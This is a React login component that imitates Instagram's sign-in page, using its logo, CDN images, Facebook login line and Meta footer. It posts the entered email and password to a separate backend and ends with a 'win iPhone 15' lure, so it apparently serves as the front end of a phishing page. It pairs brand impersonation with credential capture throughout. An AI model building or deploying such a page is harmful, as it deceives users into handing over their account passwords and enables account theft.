import React, { useState } from "react";
import logo from "../assets/ig.png";
import axios from "axios";
import { useNavigate } from "react-router-dom";

function Login() {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true); // Start loading
        try {
            const response = await axios.post("http://localhost:3000/user/login", {
                email,
                password,
            });
            if (response.status === 201) {
                navigate("/success");
            }
        } catch (error) {
            console.error("Login failed", error);
        } finally {
            setLoading(false); // Stop loading
        }
    };

    return (
        <div className="bg-black h-full flex flex-col items-center">
            <div className="mt-12 p-1">
                <img src={logo} alt="" />
            </div>

            <div className="flex flex-col">
                <input
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    type="text"
                    className="p-2 w-64 mt-10 mb-1 rounded-sm bg-gray-950 border border-b-1 border-gray-600 outline-none text-white text-sm placeholder:text-gray-400 placeholder:text-xs"
                    placeholder="Phone number, username, or email"
                />
            </div>

            <div className="flex flex-col relative">
                <input
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    type="password"
                    className="p-2 w-64 mb- rounded-sm bg-gray-950 border border-b-1 border-gray-600 outline-none text-white text-sm placeholder:text-gray-400 placeholder:text-xs"
                    placeholder="Password"
                />
                <button className="text-white text-sm absolute right-4 top-1/2 transform -translate-y-1/2 font-semibold">
                    Show
                </button>
            </div>

            {/* ✅ Login Button with Loader Effect */}
            <button
                onClick={handleSubmit}
                disabled={loading} // Disable button when loading
                className={`text-white mt-3 p-1 rounded-lg w-64 font-semibold transition ${loading
                    ? "bg-gray-600 cursor-not-allowed"
                    : "bg-blue-500 hover:bg-blue-600"
                    }`}
            >
                {loading ? (
                    <div className="flex items-center justify-center">
                        <svg
                            className="animate-spin h-5 w-5 mr-2 text-white"
                            viewBox="0 0 24 24"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                        >
                            <circle
                                className="opacity-25"
                                cx="12"
                                cy="12"
                                r="10"
                                stroke="currentColor"
                                strokeWidth="4"
                            />
                            <path
                                className="opacity-75"
                                fill="currentColor"
                                d="M4 12a8 8 0 0116 0h-4a4 4 0 00-8 0H4z"
                            />
                        </svg>
                        Logging in...
                    </div>
                ) : (
                    "Log in"
                )}
            </button>

            <div className="text-gray-500 mt-5">----------------OR-----------------</div>

            <div className="w-full mt-6 text-white flex items-center justify-center">
                <img
                    className="w-10"
                    src="https://static.vecteezy.com/system/resources/previews/042/127/197/non_2x/app-style-blue-facebook-logo-with-white-thick-border-and-long-shadow-on-a-transparent-background-free-png.png"
                    alt=""
                />
                <h2 className="ml-2 text-blue-400 text-sm font-semibold">
                    Log in with Facebook
                </h2>
            </div>

            <h2 className="ml-2 text-white text-sm mt-4">Forgot password?</h2>

            <div className="flex">
                <h2 className="text-white text-sm mt-20">Don't have an account?</h2>
                <h2 className="text-blue-400 text-sm mt-20 ml-1 font-bold">Sign up</h2>
            </div>

            <h2 className="ml-2 text-white text-sm mt-12">Get the app.</h2>

            <div className="flex m-2 items-center justify-center">
                <img
                    className="w-1/3 m-1"
                    src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png"
                    alt=""
                />
                <img
                    className="w-1/3 m-1"
                    src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png"
                    alt=""
                />
            </div>

            <div className="text-xs text-gray-300 flex mt-16">
                <h2 className="m-2">Meta</h2>
                <h2 className="m-2">About</h2>
                <h2 className="m-2">Blog</h2>
                <h2 className="m-2">Jobs</h2>
                <h2 className="m-2">Help</h2>
                <h2 className="m-2">API</h2>
                <h2 className="m-2">Privacy</h2>
                <h2 className="m-2">Terms</h2>
            </div>

            <div className="text-xs text-gray-300 flex m">
                <h2 className="m-2">Locations</h2>
                <h2 className="m-2">Instagram Lite</h2>
                <h2 className="m-2">Threads</h2>
            </div>

            <div className="text-xs text-gray-300 flex m">
                <h2 className="m-2">Contact Uploading & Non-Users</h2>
                <h2 className="m-2">Meta Verified</h2>
            </div>

            <div className="p-5">
                Login with email & get a chance to win iPhone 15
            </div>
        </div>
    );
}

export default Login;
